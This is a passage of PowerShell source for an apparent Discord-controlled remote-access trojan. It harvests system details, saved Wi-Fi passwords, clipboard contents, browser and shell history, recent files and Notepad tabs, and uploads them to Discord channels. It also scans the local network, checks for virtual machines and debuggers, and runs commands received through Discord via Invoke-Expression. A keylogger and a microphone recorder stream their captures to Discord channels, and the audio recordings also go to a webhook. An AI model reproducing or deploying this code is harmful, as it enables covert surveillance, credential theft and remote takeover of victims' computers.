        $videocardinfo = Get-WmiObject Win32_VideoController; $gpu = "$($videocardinfo.Name)"
        $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
        $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem | Out-String
        $computerSystemInfo = $computerSystemInfo -split "`r?`n" | Where-Object { $_ -ne '' } | Out-String
    
        # HDD Information
        $HddInfo = Get-WmiObject Win32_LogicalDisk | 
        Select-Object DeviceID, VolumeName, FileSystem, 
        @{Name = "Size_GB"; Expression = { "{0:N1} GB" -f ($_.Size / 1Gb) } }, 
        @{Name = "FreeSpace_GB"; Expression = { "{0:N1} GB" -f ($_.FreeSpace / 1Gb) } }, 
        @{Name = "FreeSpace_percent"; Expression = { "{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace))) } } | 
        Format-List
        $HddInfo = ($HddInfo | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }
    
        # Disk Health
        $DiskHealth = Get-PhysicalDisk | 
        Select-Object FriendlyName, OperationalStatus, HealthStatus | 
        Format-List
        $DiskHealth = ($DiskHealth | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }
    
        # Current System Metrics
        function Get-PerformanceMetrics {
            $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    
            return [PSCustomObject]@{
                CPUUsage    = "{0:F2}" -f $cpuUsage.CookedValue
                MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
                DiskIO      = "{0:F2}" -f $diskIO.CookedValue
                NetworkIO   = "{0:F2}" -f $networkIO.CookedValue
            }
        }
        $metrics = Get-PerformanceMetrics
        $PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
        $PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
        $PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
        $PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
    
        #Anti-virus Info
        $AVinfo = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
        $AVinfo | ForEach-Object { $_.Trim() }
        $AVinfo = ($AVinfo | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }
    
        # Enumerate Network Public IP
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    
        # Saved WiFi Network Info
        $outssid = $null
        $a = 0
        $ws = (netsh wlan show profiles) -replace ".*:\s+"
        foreach ($s in $ws) {
            if ($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5) {
                $ssid = $s.Trim()
                if ($s -Match ":") {
                    $ssid = $s.Split(":")[1].Trim()
                }
                $pw = (netsh wlan show profiles name=$ssid key=clear)
                $pass = "None"
                foreach ($p in $pw) {
                    if ($p -Match "Key Content") {
                        $pass = $p.Split(":")[1].Trim()
                        $outssid += "SSID: $ssid | Password: $pass`n"
                    }
                }
            }
            $a++
        }
    
        # Get the local IPv4 address
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object SuffixOrigin -eq "Dhcp" | Select-Object -ExpandProperty IPAddress)
    
        if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
            $subnet = $matches[1]
    
            1..254 | ForEach-Object {
                Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
            }
    
            # Retrieve the list of computers in the subnet
            $Computers = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +', ',' | ConvertFrom-Csv -Header Computername, IPv4, MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
    
            # Add Hostname property and build scan result
            $scanresult = ""
            $Computers | ForEach-Object {
                try {
                    $ip = $_.IPv4
                    $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
                }
                catch {
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)" -Force
                }
    
                $scanresult += "IP Address: $($_.IPv4) `n"
                $scanresult += "MAC Address: $($_.MAC) `n"
                if ($_.Hostname) {
                    $scanresult += "Hostname: $($_.Hostname) `n"
                }
                $scanresult += "`n"
            }
        }
    
        $NearbyWifi = (netsh wlan show networks mode=Bssid | ? { $_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*" }).trim() | Format-Table SSID, Signal, Band
        $Wifi = ($NearbyWifi | Out-String)
    
    
        #Virtual Machine Detection Setup
        $isVM = $false
        $isDebug = $false
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $Width = $screen.Bounds.Width
        $Height = $screen.Bounds.Height
        $networkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null }
        $services = Get-Service
        $vmServices = @('vmtools', 'vmmouse', 'vmhgfs', 'vmci', 'VBoxService', 'VBoxSF')
        $manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
        $vmManufacturers = @('Microsoft Corporation', 'VMware, Inc.', 'Xen', 'innotek GmbH', 'QEMU')
        $model = (Get-WmiObject Win32_ComputerSystem).Model
        $vmModels = @('Virtual Machine', 'VirtualBox', 'KVM', 'Bochs')
        $bios = (Get-WmiObject Win32_BIOS).Manufacturer
        $vmBios = @('Phoenix Technologies LTD', 'innotek GmbH', 'Xen', 'SeaBIOS')
        $runningTaskManagers = @()
    
        # Debugger Check
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
    
            public class DebuggerCheck {
                [DllImport("kernel32.dll")]
                public static extern bool IsDebuggerPresent();
    
                [DllImport("kernel32.dll", SetLastError=true)]
                public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
            }
"@
        $isDebuggerPresent = [DebuggerCheck]::IsDebuggerPresent()
        $isRemoteDebuggerPresent = $false
        [DebuggerCheck]::CheckRemoteDebuggerPresent([System.Diagnostics.Process]::GetCurrentProcess().Handle, [ref]$isRemoteDebuggerPresent) | Out-Null
        if ($isDebuggerPresent -or $isRemoteDebuggerPresent) {
            $script:isdebug = $true
        }
    
        #Virtual Machine Indicators
        $commonResolutions = @("1280x720", "1280x800", "1280x1024", "1366x768", "1440x900", "1600x900", "1680x1050", "1920x1080", "1920x1200", "2560x1440", "3840x2160")
        $vmChecks = @{"VMwareTools" = "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"; "VMwareMouseDriver" = "C:\WINDOWS\system32\drivers\vmmouse.sys"; "VMwareSharedFoldersDriver" = "C:\WINDOWS\system32\drivers\vmhgfs.sys"; "SystemBiosVersion" = "HKLM:\HARDWARE\Description\System\SystemBiosVersion"; "VBoxGuestAdditions" = "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions"; "VideoBiosVersion" = "HKLM:\HARDWARE\Description\System\VideoBiosVersion"; "VBoxDSDT" = "HKLM:\HARDWARE\ACPI\DSDT\VBOX__"; "VBoxFADT" = "HKLM:\HARDWARE\ACPI\FADT\VBOX__"; "VBoxRSDT" = "HKLM:\HARDWARE\ACPI\RSDT\VBOX__"; "SystemBiosDate" = "HKLM:\HARDWARE\Description\System\SystemBiosDate"; }
        $taskManagers = @("taskmgr", "procmon", "procmon64", "procexp", "procexp64", "perfmon", "perfmon64", "resmon", "resmon64", "ProcessHacker")
        $currentResolution = "$Width`x$Height"
        if (!($commonResolutions -contains $currentResolution)) { $rescheck = "Resolution Check : FAIL" }else { $rescheck = "Resolution Check : PASS" }
        if ($vmManufacturers -contains $manufacturer) { $ManufaturerCheck = "Manufaturer Check : FAIL" }else { $ManufaturerCheck = "Manufaturer Check : PASS" }
        if ($vmModels -contains $model) { $ModelCheck = "Model Check : FAIL" }else { $ModelCheck = "Model Check : PASS" }
        if ($vmBios -contains $bios) { $BiosCheck = "Bios Check : FAIL" }else { $BiosCheck = "Bios Check : PASS" }
    
        foreach ($service in $vmServices) { if ($services -match $service) { $script:isVM = $true } }
        foreach ($check in $vmChecks.GetEnumerator()) { if (Test-Path $check.Value) { $script:isVM = $true } }
        foreach ($adapter in $networkAdapters) {
            $macAddress = $adapter.MACAddress -replace ":", ""
            if ($macAddress.StartsWith("080027")) { $script:isVM = $true }
            elseif ($macAddress.StartsWith("000569") -or $macAddress.StartsWith("000C29") -or $macAddress.StartsWith("001C14")) { $script:isVM = $true }
        }
    
        # List Running Task Managers
        foreach ($taskManager in $taskManagers) {
            if (Get-Process -Name $taskManager -ErrorAction SilentlyContinue) {
                $runningTaskManagers += $taskManager
            }
        }
        if (!($runningTaskManagers)) {
            $runningTaskManagers = "None Found.."
        }
    
        if ($isVM) {   
            $vmD = "FAIL!"
        }
        else {
            $vmD = "PASS"
        }
        if ($isDebug) {
            $debugD = "FAIL!"
        }
        else {
            $debugD = "PASS"
        }
        $vmDetect = "VM Check : $vmD"
        $debugDetect = "Debugging Check : $debugD"
    
    
        $clipboard = Get-Clipboard
        if (!($clipboard)) {
            $clipboard = "No Data Found.."
        }
        # History and Bookmark Data
        $Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $Paths = @{
            'chrome_history'   = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            'chrome_bookmarks' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            'edge_history'     = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
            'edge_bookmarks'   = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
            'firefox_history'  = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            'opera_history'    = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
            'opera_bookmarks'  = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
        }
        $Browsers = @('chrome', 'edge', 'firefox', 'opera')
        $DataValues = @('history', 'bookmarks')
        $outpath = "$env:temp\Browsers.txt"
        foreach ($Browser in $Browsers) {
            foreach ($DataValue in $DataValues) {
                $PathKey = "${Browser}_${DataValue}"
                $Path = $Paths[$PathKey]
    
                $entry = Get-Content -Path $Path | Select-String -AllMatches $Expression | % { ($_.Matches).Value } | Sort -Unique
    
                $entry | ForEach-Object {
                    [PSCustomObject]@{
                        Browser  = $Browser
                        DataType = $DataValue
                        Content  = $_
                    }
                } | Out-File -FilePath $outpath -Append
            }
        }
        $entry = Get-Content -Path $outpath
        $entry = ($entry | Out-String)
    
        # System Information
        $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object { [Wmi]($_.Dependent) } | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices | Out-String)
        $process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process | Out-String)
        $service = Get-CimInstance -ClassName Win32_Service | select State, Name, StartName, PathName | Where-Object { $_.State -like 'Running' }; $service = ($service | Out-String)
        $software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software | Out-String)
        $drivers = Get-WmiObject Win32_PnPSignedDriver | where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
        $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; $pshistory = Get-Content $pshist -raw ; $pshistory = ($pshistory | Out-String) 
        $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime; $RecentFiles = ($RecentFiles | Out-String)
    
        function EnumNotepad {
            $appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
            $directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
            $matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
            foreach ($dir in $matchingDirectories) {
                $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
                $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
                foreach ($fullFilePath in $listOfBinFiles) {
                    if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
                        continue
                    }
                    $seperator = ("=" * 60)
                    $SMseperator = ("-" * 60)
                    $seperator | Out-File -FilePath $outpath -Append
                    $filename = $fullFilePath.Name
                    $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
                    $isSavedFile = $contents[3]
                    if ($isSavedFile -eq 1) {
                        $lengthOfFilename = $contents[4]
                        $filenameEnding = 5 + $lengthOfFilename * 2
                        $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
                        "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
                        $filename | Out-File -FilePath $outpath -Append
                        $SMseperator | Out-File -FilePath $outpath -Append
                        Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append
    
                    }
                    else {
                        "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
                        $filename | Out-File -FilePath $outpath -Append
                        $SMseperator | Out-File -FilePath $outpath -Append
                        $filenameEnding = 0
                        $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
                        $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
                        $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
                        $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
                        $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
                        $originalFileContent = ""
                        for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                            if ($originalFileBytes[$i] -ne 0) {
                                $originalFileContent += [char]$originalFileBytes[$i]
                            }
                        }
                        $originalFileContent | Out-File -FilePath $outpath -Append
                    }
                    "`n" | Out-File -FilePath $outpath -Append
                }
            }
        }
    
    
    
    
        $infomessage = "
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================
"

        $infomessage1 = "
=======================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=======================================
User Information
---------------------------------------
Current User      : $env:USERNAME
Full Name         : $fullName
Email Address     : $email
Other Users       : $users

OS Information
---------------------------------------
Language          : $systemLanguage
Keyboard Layout   : $keyboardLayoutID
Current OS        : $OSString
Build ID          : $WinVersion
Architechture     : $OSArch
Screen Size       : $screensize
Activation Date   : $activated
Location          : $GPS

Hardware Information
---------------------------------------
Processor         : $processor 
Memory            : $RamInfo
Gpu               : $gpu

System Information
---------------------------------------
$computerSystemInfo

Storage
---------------------------------------
$Hddinfo
$DiskHealth

Current System Metrics
---------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio

AntiVirus Providers
---------------------------------------
$AVinfo

Network Information
---------------------------------------
Public IP Address : $computerPubIP
Local IP Address  : $localIP

Saved WiFi Networks
---------------------------------------
$outssid

Nearby Wifi Networks
---------------------------------------
$Wifi

Other Network Devices
---------------------------------------
$scanresult

Virtual Machine Test
---------------------------------------
$rescheck
$ManufaturerCheck
$ModelCheck
$BiosCheck
$vmDetect

Debugging Software Check
---------------------------------------
$debugDetect

Running Task Managers
---------------------------------------
$runningTaskManagers

"


        $infomessage2 = "

==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
---------------------------------------
$entry

Powershell History
---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="
    
        $outpath = "$env:TEMP/systeminfo.txt"
        $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
        $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
        $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
    
        if ($OSString -like '*11*') {
            EnumNotepad
        }
        else {
            "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
        }
    
    
        $resultLines = $infomessage1 -split "`n"
        $currentBatch = ""
        foreach ($line in $resultLines) {
            $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
    
            if (([System.Text.Encoding]::Unicode.GetByteCount($currentBatch) + $lineSize) -gt 1900) {
                sendMsg -Message "``````$currentBatch`````` "
                Start-Sleep -Seconds 1
                $currentBatch = ""
            }
    
            $currentBatch += $line + "`n" 
        }
    
        if ($currentBatch -ne "") {
            sendMsg -Message "``````$currentBatch`````` "
        }
    
        sendFile -sendfilePath $outpath -ChannelID $LootID
        Sleep 1
        Remove-Item -Path $outpath -force
    }

    
    Function FolderTree {
        sendMsg -Message ":arrows_counterclockwise: ``Getting File Trees..`` :arrows_counterclockwise:"
        tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
        tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
        tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
        $FilePath = "$env:temp/TreesOfKnowledge.zip"
        Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
        sleep 1
        sendFile -sendfilePath $FilePath | Out-Null
        rm -Path $FilePath -Force
        Write-Output "Done."
    }

    sendMsg -Message ":hourglass: ``$env:COMPUTERNAME Getting Loot Files.. Please Wait`` :hourglass:"
    SystemInfo
    BrowserDB
    FolderTree

}

# Scriptblock for PS console in discord
$doPowershell = {
    param([string]$token, [string]$PowershellID)
    Function Get-BotUserId {
        $headers = @{
            'Authorization' = "Bot $token"
        }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
        $botInfo = $botInfo | ConvertFrom-Json
        return $botInfo.id
    }
    $botId = Get-BotUserId
    Start-Sleep -Seconds 2
    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
    $w = New-Object System.Net.WebClient
    $w.Headers.Add("Authorization", "Bot $token")
    
    # Vérifier si on a les droits admin
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
    $adminStatus = if ($isAdmin) { " [ADMIN]" } else { " [USER]" }
    
    function senddir {
        $dir = $PWD.Path
        $w.Headers.Add("Content-Type", "application/json")
        $j = @{"content" = "``PS$adminStatus | $dir >``" } | ConvertTo-Json
        try {
            $x = $w.UploadString($url, "POST", $j)
        }
        catch {
            Write-Host "Error sending directory: $($_.Exception.Message)"
        }
    }
    senddir
    $p = $null
    while ($true) {
        try {
            $msg = $w.DownloadString($url)
            $r = ($msg | ConvertFrom-Json)[0]
            if ($r -and $r.author -and $r.author.id -ne $botId) {
                $a = $r.timestamp
                $msgContent = $r.content
                if ($a -ne $p -and $msgContent) {
                    $p = $a
                    try {
                        # Exécuter la commande avec capture complète de la sortie
                        $ErrorActionPreference = 'Continue'
                        $out = Invoke-Expression $msgContent 2>&1 | Out-String
                        
                        # Si pas de sortie, vérifier si la commande a réussi
                        if ([string]::IsNullOrWhiteSpace($out)) {
                            $out = "Command executed successfully (no output)"
                        }
                        
                        # Diviser en lignes et traiter
                        $resultLines = $out -split "`r?`n"
                        $maxMessageSize = 1950  # Limite Discord ~2000, on utilise 1950 pour être sûr
                        $currentBatch = ""
                        $batchNumber = 1
                        $totalBatches = [Math]::Ceiling(($out.Length / $maxMessageSize))
                        
                        foreach ($line in $resultLines) {
                            $lineWithNewline = $line + "`n"
                            $lineSize = [System.Text.Encoding]::UTF8.GetByteCount($lineWithNewline)
                            
                            if (([System.Text.Encoding]::UTF8.GetByteCount($currentBatch) + $lineSize) -gt $maxMessageSize) {
                                # Envoyer le batch actuel
                                if ($currentBatch.Length -gt 0) {
                                    $w.Headers.Add("Content-Type", "application/json")
                                    $batchContent = "``````$currentBatch``````"
                                    if ($totalBatches -gt 1) {
                                        $batchContent = "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                                    }
                                    $j = @{"content" = $batchContent } | ConvertTo-Json
                                    try {
                                        $x = $w.UploadString($url, "POST", $j)
                                        Start-Sleep -Milliseconds 500
                                    }
                                    catch {
                                        Write-Host "Error sending batch: $($_.Exception.Message)"
                                    }
                                    $batchNumber++
                                    $currentBatch = ""
                                }
                            }
                            
                            # Ajouter la ligne au batch actuel
                            $currentBatch += $lineWithNewline
                        }
                        
                        # Envoyer le dernier batch
                        if ($currentBatch.Length -gt 0) {
                            $w.Headers.Add("Content-Type", "application/json")
                            $batchContent = "``````$currentBatch``````"
                            if ($totalBatches -gt 1) {
                                $batchContent = "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                            }
                            $j = @{"content" = $batchContent } | ConvertTo-Json
                            try {
                                $x = $w.UploadString($url, "POST", $j)
                            }
                            catch {
                                Write-Host "Error sending final batch: $($_.Exception.Message)"
                            }
                        }
                        
                        senddir
                    }
                    catch {
                        $errorDetails = $_.Exception | Format-List -Force | Out-String
                        $errorMessage = "Error: $($_.Exception.Message)`n`nDetails:`n$errorDetails"
                        
                        # Diviser les erreurs aussi si nécessaire
                        $maxErrorSize = 1950
                        if ($errorMessage.Length -gt $maxErrorSize) {
                            $errorParts = $errorMessage -split "`n"
                            $currentErrorBatch = ""
                            foreach ($part in $errorParts) {
                                if (([System.Text.Encoding]::UTF8.GetByteCount($currentErrorBatch + "`n" + $part)) -gt $maxErrorSize) {
                                    if ($currentErrorBatch.Length -gt 0) {
                                        $w.Headers.Add("Content-Type", "application/json")
                                        $j = @{"content" = "``````$currentErrorBatch``````" } | ConvertTo-Json
                                        try {
                                            $x = $w.UploadString($url, "POST", $j)
                                            Start-Sleep -Milliseconds 500
                                        }
                                        catch {
                                            Write-Host "Error sending error batch: $($_.Exception.Message)"
                                        }
                                        $currentErrorBatch = ""
                                    }
                                }
                                $currentErrorBatch += $part + "`n"
                            }
                            if ($currentErrorBatch.Length -gt 0) {
                                $w.Headers.Add("Content-Type", "application/json")
                                $j = @{"content" = "``````$currentErrorBatch``````" } | ConvertTo-Json
                                try {
                                    $x = $w.UploadString($url, "POST", $j)
                                }
                                catch {
                                    Write-Host "Error sending final error batch: $($_.Exception.Message)"
                                }
                            }
                        }
                        else {
                            $w.Headers.Add("Content-Type", "application/json")
                            $j = @{"content" = "``````$errorMessage``````" } | ConvertTo-Json
                            try {
                                $x = $w.UploadString($url, "POST", $j)
                            }
                            catch {
                                Write-Host "Error sending error message: $($_.Exception.Message)"
                            }
                        }
                        senddir
                    }
                }
            }
        }
        catch {
            Write-Host "Error in PowerShell loop: $($_.Exception.Message)"
        }
        Start-Sleep -Milliseconds 1000  # Réduire le délai pour une réponse plus rapide
    }
}

# Scriptblock for keycapture to discord
$doKeyjob = {
    param([string]$token, [string]$keyID)
    sleep 5
    $script:token = $token
    function sendMsg {
        param([string]$Message)
        $url = "https://discord.com/api/v10/channels/$keyID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($Message) {
            $jsonBody = @{
                "content"  = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
            $message = $null
        }
    }
    Function Kservice {   
        sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
        $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
        try {
            $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
        }
        catch {
            # Si le type existe déjà, on l'utilise
            $API = [API.Win32]
        }
        $pressed = [System.Diagnostics.Stopwatch]::StartNew()
        # Change for frequency
        $maxtime = [TimeSpan]::FromSeconds(10)
        $keymem = ""
        While ($true) {
            $down = $false
            try {
                while ($pressed.Elapsed -lt $maxtime) {
                    Start-Sleep -Milliseconds 30
                    for ($capture = 8; $capture -le 254; $capture++) {
                        $keyst = $API::GetAsyncKeyState($capture)
                        if ($keyst -eq -32767) {
                            $down = $true
                            $pressed.Restart()
                            $null = [console]::CapsLock
                            $vtkey = $API::MapVirtualKey($capture, 3)
                            $kbst = New-Object Byte[] 256
                            $null = $API::GetKeyboardState($kbst)
                            $strbuild = New-Object -TypeName System.Text.StringBuilder 256
                             
                            if ($API::ToUnicode($capture, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
                                $collected = $strbuild.ToString()
                                if ($capture -eq 27) { $collected = "[ESC]" }
                                if ($capture -eq 8) { $collected = "[BACK]" }
                                if ($capture -eq 13) { $collected = "[ENT]" }
                                if ($capture -eq 32) { $collected = " " }
                                if ($capture -eq 9) { $collected = "[TAB]" }
                                $keymem += $collected 
                            }
                        }
                    }
                }
            }
            catch {
                Write-Host "Error in keylogger: $($_.Exception.Message)"
            }
            finally {
                If ($down -and $keymem -ne "") {
                    $escmsgsys = $keymem -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;') }
                    if ($escmsgsys.Length -gt 0) {
                        sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
                    }
                    $down = $false
                    $keymem = ""
                }
            }
            $pressed.Restart()
            Start-Sleep -Milliseconds 10
        }
    }
    Kservice
}

# Scriptblock for microphone input to discord
$audiojob = {
    param ([string]$token, [string]$MicrophoneID, [string]$MicrophoneWebhook)
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$MicrophoneID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($MicrophoneWebhook) {
                    $hooksend = $wc.UploadFile($MicrophoneWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $outputFile = "$env:Temp\Audio.mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        return (get-ItemProperty $reg).FriendlyName
    }
    $id1 = [audio]::GetDefault(1)
    $MicName = "$(getFriendlyName $id1)"
    while ($true) {
        .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
        sendFile -sendfilePath $outputFile | Out-Null
        sleep 1
        rm -Path $outputFile -Force
    }
}

# Scriptblock for desktop screenshots to discord
